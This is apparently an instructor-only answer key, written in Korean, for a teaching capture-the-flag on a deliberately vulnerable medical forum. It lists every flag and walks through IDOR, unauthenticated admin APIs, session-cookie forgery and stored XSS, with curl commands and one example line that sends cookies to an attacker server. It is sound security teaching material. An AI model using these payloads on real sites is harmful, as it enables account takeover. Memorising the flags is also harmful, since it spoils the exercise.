# 🔐 mini-CTF 정답 풀이 (강사·관리자 전용)

> ⚠️ **학생 배부 금지.** 이 문서에는 모든 깃발(flag)과 정확한 획득 절차가 들어 있다.
> 강좌 사이트에서도 **admin 등급으로 로그인해야만** 열린다(`/solutions`).
>
> 표적: **MediForum** `http://<victim-ip>:3003` (아래 예시는 `localhost` 기준 — 실제 IP로 바꿔 사용).
> **모든 문제는 브라우저(크롬/엣지) + F12 만으로 풀 수 있다.** 각 문제마다
> ① 학생이 밟는 브라우저 절차, ② 왜 뚫리는지, ③ 방어책, ④ (참고) curl 한 줄을 적었다.
> 수업에서는 ①만 쓰고, ④는 "기계가 하는 방식"으로 마지막에 잠깐 보여 주는 용도다.

| # | 문제 | 취약점 | 깃발 | 출발점 |
|---|------|--------|------|--------|
| 1 | 페이지 속 깃발 | 정보 노출(소스 주석) | `flag{v13w_s0urc3_r3con}` | Ctrl+U |
| 2 | 인증 없는 회원 API | Broken Access Control + PII | `flag{n0_4uth_us3r_ap1}` | F12 → Network |
| 3 | 남의 진료기록 | IDOR | `flag{1d0r_m3d_r3c0rds}` | 주소창 번호 |
| 4 | 관리자 쪽지 도청 | Broken Admin Auth | `flag{4dm1n_dm_l34k}` | robots.txt → /admin |
| 5 | 예측 가능한 세션 | Predictable Session | `flag{pr3d1ct4bl3_s3ss10n}` | F12 → Cookies |
| 6 | 저장형 XSS | Stored XSS + 관리자 봇 | `flag{st0r3d_xss_4dm1n_b0t}` | 글쓰기 → 신고 → 검토 |

**총 850점.** 권장 진행: 1·2(워밍업) → 3·4(본 게임) → 5·6(보스).

---

## 0. 수업 시작 전 강사 체크리스트 (5분)

```bash
# ① 표적·플랫폼 기동
cd infra && ./start.sh victim      # 학생 PC 쪽:  DVWA / NeoBank / MediForum / AICompanion
cd infra && ./start.sh hub         # 강사 서버 쪽: 강좌사이트 / CTFd / AI도우미

# ② CTFd 관리자 생성 + 문제 등록 (최초 1회)
cd ctf
python3 setup_ctfd.py --ctfd http://<hub-ip>:8000 --admin admin --password '비번' --email admin@ezweb.local
python3 import_challenges.py --ctfd http://<hub-ip>:8000 --token <TOKEN> --victim <victim-ip> --replace

# ③ ★가장 중요★ 사이트 깃발 == 정답표 == CTFd 등록값 3자 일치 자동 검사
python3 verify_ctf.py --victim <victim-ip> --ctfd http://<hub-ip>:8000 --token <TOKEN> --submit
```

`verify_ctf.py` 가 6문제를 실제로 풀어 보고, `challenges.yml` 과 대조하고, 테스트 계정으로
**제출까지 해서 `correct` 가 뜨는지** 확인한다. 여기서 전부 ✓ 가 나오면 "학생이 깃발을 찾아
넣었는데 오답" 사고는 구조적으로 발생할 수 없다. 하나라도 ✗ 면 수업을 시작하지 말고 고친다.

> **📌 과거에 났던 "전부 오답" 사고 — 실제 원인 (CTFd DB 포렌식으로 확인)**
>
> 이전 CTFd 데이터베이스를 직접 열어 확인한 결과, **깃발은 처음부터 정상 등록돼 있었다**
> (challenge_id 1~6, 값도 정확). 등록 스크립트에는 문제가 없었다.
> 진짜 원인은 `submissions` 테이블에 그대로 남아 있었다 — 오답 7건 중:
>
> | 제출 | 문제 | 넣은 값 | 원인 |
> |------|------|---------|------|
> | #1 | 2번 | `n0_4uth_us3r_ap1` | **`flag{ }` 를 빼고 제출** |
> | #2 | 3번 | `pr3d1ct4bl3_s3ss10n` | 껍데기 누락 + **5번 답을 3번에** |
> | #3·#4 | 3번 | `flag{pr3d1ct4bl3_s3ss10n}` | **5번 답을 3번 문제에 제출** |
> | #5 | 6번 | `st0r3d_xss_4dm1n_b0t` | 껍데기 누락 |
> | #6·#7 | 1번 | `v13w_s0urc3_r3con` | 껍데기 누락 |
>
> 즉 **7건 중 5건이 중괄호 누락, 3건이 문제 번호 혼동**이었다. 코드 버그가 아니라
> **채점 관용도와 문제 설명의 문제**였다. 그래서 이렇게 고쳤다.
>
> 1. **관용 채점** — 이제 각 문제에 깃발을 2개 등록한다. 정적(대소문자 무시) + 정규식.
>    정규식이 **앞뒤 공백 · 대소문자 · 중괄호 누락**까지 정답 처리한다.
>    (실제 오답 5건을 그대로 재현 제출해 전부 `correct` 가 나오는 것을 확인했다.
>     반면 **다른 문제의 답이나 한 글자 오타는 여전히 오답**이다 — 문제의 의미는 유지된다.)
> 2. **문제 설명 재작성** — 모든 문제 설명이 "찾은 `flag{...}` 를 **중괄호까지 통째로**"
>    라고 명시하고, 문제마다 브라우저 출발점이 서로 겹치지 않게 분리해 번호 혼동을 줄였다.
> 3. **사이트 값 == 정답 보장** — MediForum 이 **부팅할 때마다** 깃발 레코드를 강제로 다시
>    심는다(`ensure_ctf_flags()`). 오래된 DB 나 학생의 mass assignment 로 admin `api_key`
>    가 바뀌어도 재기동하면 원복된다.
> 4. **자동 자가 점검** — `verify_ctf.py` 가 표적↔정답표↔CTFd 3자 일치와 실제 제출까지 확인한다.

---

## 1. 페이지 속 깃발 (Recon, 50점) — `flag{v13w_s0urc3_r3con}`

**개념.** 브라우저 화면은 서버가 보내 준 HTML 을 그린 결과일 뿐이다. HTML 주석
(`<!-- ... -->`)은 화면에 그려지지 않지만 **원본에는 그대로 남아 있고 누구나 볼 수 있다.**
MediForum 의 공지 글 본문이 `|safe` 로 출력되어, 본문에 적힌 주석이 페이지 소스에 실린다.

### 학생 절차 (브라우저)
1. `http://localhost:3003` 접속.
2. 게시판에서 **[공지] 의료정보 무단 전송 금지** 글을 클릭한다(글 id 4).
3. `Ctrl + U` (맥: `Option+Command+U`) → 페이지 소스 창이 새 탭에 열린다.
   - F12 → **Elements** 탭에서 찾아도 된다.
4. 소스 창에서 `Ctrl + F` → `flag` 또는 `TODO` 검색.
5. 아래 주석이 보인다:
   `<!-- TODO(admin): 배포 전에 이 메모 꼭 지우기! 임시 관리자 인수인계 코드 = flag{v13w_s0urc3_r3con} -->`

### 자주 막히는 지점
- Ctrl+U 가 안 먹는 브라우저 → 주소창 앞에 `view-source:` 를 붙여도 된다
  (`view-source:http://localhost:3003/posts/4`).
- 홈 화면 소스에서 찾으려 함 → **글 상세 페이지**를 열어야 본문이 실린다.

### 왜 뚫리나 / 방어
민감 정보를 주석·소스에 남기지 않는다. 디버그 메모·내부 주소·임시 비밀번호는 배포 전 제거하고,
커밋 훅이나 CI 로 `TODO`/`password`/`flag` 같은 패턴을 자동 검사한다.

### (참고) curl
```bash
curl -s http://localhost:3003/posts/4 | grep -o 'flag{[^}]*}'
```

---

## 2. 인증 없는 회원 API (Web, 100점) — `flag{n0_4uth_us3r_ap1}`

**개념.** `/search`(회원 찾기) 화면은 껍데기이고, 실제 데이터는 브라우저가 `fetch('/api/users')`
로 가져온다. 이 API 는 **로그인 검사가 없고**, 응답에 전 회원의 email·ssn·phone·api_key 가
평문으로 들어 있다(A01 Broken Access Control + A02 민감정보 노출). 관리자 계정의 `api_key`
자리에 깃발이 들어 있다.

### 학생 절차 (브라우저) — 이 문제의 정공법
1. 상단 메뉴 **회원 찾기** 클릭 (`/search`).
2. `F12` → **Network** 탭을 켠다. (비어 있으면 그대로 두고 다음 단계)
3. 검색어에 `admin` 을 넣고 **검색**.
4. Network 목록에 `users?q=admin` 같은 줄이 새로 생긴다. 클릭 →
   **Response**(또는 미리보기/Preview) 탭.
5. `"role":"admin"` 인 항목의 `"api_key"` 값이 `flag{n0_4uth_us3r_ap1}`.
   - 화면 표에도 **API key** 칸이 그대로 보이므로, F12 없이도 눈으로 확인할 수 있다.
6. Network 에서 알아낸 주소를 **주소창에 그대로 붙여 넣으면**
   (`http://localhost:3003/api/users`) 로그인 없이 전 회원 정보가 통째로 뜬다 —
   "화면은 잠갔는데 뒷문은 안 잠갔다"를 눈으로 확인하는 순간이다.

### 다른 발견 경로
`http://localhost:3003/robots.txt` 에 `Disallow: /api/users` 가 적혀 있다.
robots.txt 는 "검색엔진 수집 금지 목록"이지만, 실제로는 **숨기고 싶은 주소 목록**이라
정찰의 첫 삽으로 늘 쓰인다.

### 왜 뚫리나 / 방어
① API 에도 화면과 동일한 인증·인가를 강제한다. ② 응답에서 `ssn`·`api_key` 같은 민감 필드를
아예 제거하거나 마스킹한다(필요한 필드만 내려보내는 DTO). ③ `/api/admin/users` 처럼 이름만
admin 인 경로도 역할 검사(RBAC)를 반드시 넣는다.

### (참고) curl
```bash
curl -s http://localhost:3003/api/users | grep -o 'flag{[^}]*}'
```

---

## 3. 남의 진료기록 — IDOR (Web, 150점) — `flag{1d0r_m3d_r3c0rds}`

**개념.** `/records/<id>` 가 **요청자 소유 여부를 검증하지 않는다.** id 만 바꾸면 누구의
진료기록이든 열린다. 목록(`/records`)은 번호·날짜만 공개하지만, 상세는 전부 열린다.

### 학생 절차 (브라우저)
1. 상단 메뉴 **진료기록** (`/records`). 기록 5건의 목록이 보인다.
2. 아무거나 **[상세 보기]** 클릭 → 주소창이 `/records/1` 처럼 바뀐다.
3. 상세 화면 맨 아래 **[다음 기록 ▶]** 을 계속 누르거나, 주소창 숫자를 `1→2→3→4→5` 로
   직접 바꾼다.
4. **`/records/5`** — 환자 "관리자", 진단 `[VIP 비공개] 원장 종합검진`,
   **처방 / 소견**: `특이소견 없음 — 기밀코드 flag{1d0r_m3d_r3c0rds}`

### 수업 포인트
"막히지 않고 계속 열린다"는 사실 자체가 취약점의 증거다. 학생에게 꼭 물어볼 것 —
*"지금 너는 로그인도 안 했는데 왜 남의 진료기록이 보일까?"* → 서버가 소유자 확인을 안 했다.

### 왜 뚫리나 / 방어
객체 접근 시 **소유·권한 검증**을 반드시 한다(`record.patient_id == current_user.id`
또는 담당 의사만). 추가로 순차 정수 id 대신 추측 불가능한 식별자(UUID)를 쓰면 공격 난도가
올라간다(단, 그것만으로는 방어가 아니다 — 검증이 본질).

### (참고) curl
```bash
curl -s http://localhost:3003/api/medical-records | grep -o 'flag{[^}]*}'
for i in 1 2 3 4 5; do echo "== $i"; curl -s http://localhost:3003/api/medical-records/$i; echo; done
```

---

## 4. 관리자 쪽지 도청 (Web, 150점) — `flag{4dm1n_dm_l34k}`

**개념.** 관리자 콘솔 `/admin` 과 그 콘솔이 호출하는 `/api/admin/*` 이 **인증을 전혀 거치지
않는다**(V10). "admin" 이라는 경로명에 기댄 가짜 보안(security by obscurity)의 전형이다.

### 학생 절차 (브라우저)
1. `http://localhost:3003/robots.txt` 를 연다 → `Disallow: /admin`, `/admin/secret`,
   `/admin/review`, `/api/admin/` 이 그대로 적혀 있다.
2. `http://localhost:3003/admin` 접속 → **로그인하지 않았는데 관리자 콘솔이 열린다.**
3. **[✉️ 쪽지 감사]** 버튼 클릭 → 전 회원의 DM 이 표로 뜬다.
   (F12 Network 를 켜 두면 `/api/admin/dms` 를 부르는 게 보인다)
4. `body` 칸에서 `[관리자] 서버 백업 비밀번호 공유합니다: flag{4dm1n_dm_l34k}` 를 찾는다.

### 왜 뚫리나 / 방어
관리자 API 는 세션의 역할(role)을 서버에서 검사해야 한다(RBAC). 경로를 숨기는 것은 방어가
아니다 — robots.txt·JS 번들·에러 메시지·검색엔진 캐시로 언제든 드러난다. 관리 콘솔은 별도
네트워크/VPN 뒤에 두고, 접근 로그와 감사 기록을 남긴다.

### (참고) curl
```bash
curl -s http://localhost:3003/api/admin/dms | grep -o 'flag{[^}]*}'
```

---

## 5. 예측 가능한 세션 (Web, 200점, 응용) — `flag{pr3d1ct4bl3_s3ss10n}`

**개념.** 로그인 시 발급되는 세션 쿠키 `MFSID` 가 `sess-2001`, `sess-2002` … 처럼 **순차
증가**한다(V14). 관리자는 서비스 오픈 첫날 로그인해 `sess-1001` 을 갖고 있으며, 이 세션은
서버가 항상 유지한다. 쿠키를 그 값으로 바꾸면 서버는 우리를 관리자로 인식한다.
게다가 쿠키에 `HttpOnly` 도 없어(V12) 개발자도구로 자유롭게 수정된다.

### 학생 절차 (브라우저)
1. `/register` 에서 계정 생성 → `/login` 으로 로그인.
2. `F12` → **Application**(파이어폭스는 **저장소**) → 왼쪽 **Cookies** → `http://localhost:3003`
   → `MFSID` 값 확인. 예: `sess-2001`.
3. **규칙 관찰**: 계정을 하나 더 만들어 다른 브라우저(또는 시크릿 창)에서 로그인하면
   `sess-2002` 가 나온다 → *"번호가 1씩 커지는구나. 그럼 나보다 먼저 온 사람은 더 작은 번호."*
4. `/admin` → **[🔒 기밀 금고]** 클릭 → **403 접근 거부**. 그 화면의 *운영 메모* 를 읽는다:
   "세션 발급은 접속 순서대로 번호가 매겨집니다… 관리자 세션은 서비스 오픈 첫날 발급되어
   번호가 가장 빠릅니다."
5. 개발자도구 Cookies 목록에서 `MFSID` 값을 **더블클릭**해 `sess-1001` 로 고친다.
6. `/admin/secret` 페이지에서 **F5(새로고침)** → 금고가 열리고
   `flag{pr3d1ct4bl3_s3ss10n}` 이 표시된다.

### 자주 막히는 지점
- 쿠키를 고친 뒤 **새로고침을 안 함** → 반드시 F5.
- 값에 따옴표나 공백이 섞임 → `sess-1001` 정확히.
- 크롬에서 값 편집이 안 되면 Cookies 항목을 더블클릭(연필 아이콘) 하거나,
  콘솔에서 `document.cookie="MFSID=sess-1001;path=/"` 실행 후 새로고침.

### 왜 뚫리나 / 방어
세션 ID 는 **추측 불가능한 난수**(CSPRNG, 128bit 이상)로 발급해야 한다. 순차/시간 기반 ID 는
세션 하이재킹을 부른다. 쿠키에는 `HttpOnly`(JS 접근 차단)·`Secure`(HTTPS 전용)·`SameSite`
를 설정하고, 로그인·권한 변경 시 세션을 재발급(rotation)한다.

### (참고) curl
```bash
curl -s -b 'MFSID=sess-1001' -H 'Accept: application/json' http://localhost:3003/admin/secret
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:3003/admin/secret     # 403
```

---

## 6. 저장형 XSS — 관리자 봇 낚기 (Web, 200점, 보스) — `flag{st0r3d_xss_4dm1n_b0t}`

**개념.** 게시글·댓글 본문이 `{{ body|safe }}` 로 **이스케이프 없이** 렌더링된다(V01/V02).
그래서 본문에 넣은 `<script>` 는 글자가 아니라 **코드**로 페이지에 박히고, 그 글을 여는
사람의 브라우저에서 실행된다. MediForum 은 여기에 **신고 → 관리자 봇 검토**라는 실제
커뮤니티의 흐름을 붙여, "가장 권한 높은 사람을 낚는" 시나리오를 완성한다.

### 학생 절차 (브라우저) — 사람이 실제로 하는 순서
1. `/register` 에서 계정 생성 → 로그인.
2. **+ 새 글 쓰기**(`/posts/new`).
   - 제목: 아무거나 (예: `테스트`)
   - **본문**: `<script>alert('xss')</script>`
   - 저장 → 글 상세로 이동한다. (이때 내 브라우저에서 이미 경고창이 뜨면,
     "저장된 코드가 실행된다"는 걸 학생이 눈으로 확인하는 좋은 순간이다)
3. 글 하단의 **[🚨 신고하기]** 버튼 클릭 → "관리자 봇이 검토 대기열에 넣었습니다" 안내.
4. `/admin` (robots.txt 에서 찾은 관리자 콘솔) → **[🤖 신고 검토(관리자 봇)]**.
5. 봇이 신고 글을 열람하고, 본문에서 실행 가능한 코드를 발견한다 →
   붉은 상자에 `flag{st0r3d_xss_4dm1n_b0t}` 가 노출된다.
   함께 표시되는 "봇이 발견한 위험 본문" 표에서 어떤 글이 걸렸는지도 보인다.

### 왜 이 문제가 "말이 되는" 문제인가 (수업 설명)
학생이 `/admin/review` 라는 주소를 **알 필요가 없다.** 신고 버튼이 화면에 있고, 신고하면
관리자가 검토한다는 안내가 뜨고, 관리자 콘솔에 검토 메뉴가 있다. 즉 **화면을 따라가면
도착하는 곳**이다. 실제 공격자도 이렇게 한다 — 기능을 관찰하고, 누가 내 입력을 열어 보는지
찾아내고, 그 사람을 노린다.

### 실전 확장 (설명만, 실습 아님)
`alert` 자리에 `fetch('http://공격자서버/?c='+document.cookie)` 를 넣으면 관리자의 세션
쿠키가 공격자에게 전송된다 → 관리자 계정 탈취. 2005년 마이스페이스 **Samy 웜**은 이 방식으로
24시간 만에 100만 명 이상을 감염시켰다.

### 왜 뚫리나 / 방어
① 출력 시 항상 이스케이프(템플릿 자동 이스케이프 유지, `|safe` 금지).
② 서버에서 허용 태그만 남기는 sanitize(HTML 정화 라이브러리).
③ **CSP**(Content-Security-Policy)로 인라인 스크립트 실행 차단.
④ 세션 쿠키에 `HttpOnly` — 스크립트가 쿠키를 읽지 못하게.
관리자 화면(`/admin`)은 참고로 이 표적에서도 값을 이스케이프해 렌더한다 — "관리 화면에서까지
터지면 곤란하다"는 실무 감각을 보여 주는 장치다.

### (참고) curl — 기계가 하는 방식
```bash
curl -s -c /tmp/ck -d 'email=alice@user.kr&password=alice123' http://localhost:3003/login -o /dev/null
curl -s -b /tmp/ck -d 'title=t&body=<script>alert(1)</script>&tag=tip' http://localhost:3003/posts/new -o /dev/null
curl -s http://localhost:3003/admin/review | grep -o 'flag{[^}]*}'
```

---

## 7. 운영 메모

- **표적을 초기화하고 싶을 때**: `cd infra && ./stop.sh purge && ./start.sh victim`.
  MediForum DB 가 새로 만들어지고 깃발은 동일하게 다시 심긴다. 재기동만 해도
  `ensure_ctf_flags()` 가 깃발을 원복한다.
- **학생끼리 방해**: 표적은 **학생 PC 각자**에서 돌린다(한 명이 XSS 를 심거나 DVWA 비번을
  바꿔도 남에게 영향 없음). CTFd·강좌 사이트만 중앙 1대. 자세한 배치는
  [`docs/DEPLOYMENT.md`](../docs/DEPLOYMENT.md).
- **AI 도우미**(:8001)는 응답에서 `flag{...}` 를 자동으로 가린다. 학생에게 열어 줘도 안전하다.
- **점수 설계**: 1·2번(150점)은 30분 안에 전원 통과가 목표. 3·4번은 절반 이상, 5·6번은
  상위권용. 통과 기준(lab `pass_threshold`)은 0.5 — 3문제만 풀어도 통과다.
